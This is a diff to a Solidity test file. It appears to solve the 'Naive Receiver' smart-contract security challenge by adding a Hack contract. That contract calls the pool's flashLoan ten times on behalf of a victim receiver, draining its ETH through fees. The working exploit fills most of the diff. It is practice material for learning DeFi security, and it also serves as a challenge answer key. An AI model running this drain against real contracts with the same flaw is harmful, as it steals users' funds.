@@ -48,7 +48,11 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.prank(attacker);
+        Hack hack = new Hack(naiveReceiverLenderPool);
+         vm.prank(attacker);
+        hack.attack(address(flashLoanReceiver));
+    
         /**
          * EXPLOIT END *
          */
@@ -60,5 +64,19 @@ contract NaiveReceiver is Test {
         // All ETH has been drained from the receiver
         assertEq(address(flashLoanReceiver).balance, 0);
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
+    }
+}
+
+
+contract Hack {
+  NaiveReceiverLenderPool _target ;
+    constructor (NaiveReceiverLenderPool target) {
+        _target = target;
+    }
+
+    function attack(address borrower) public {
+          for (uint256 i = 0; i < 10; i++) {
+            _target.flashLoan(borrower, 0);
+        }
     }
 }
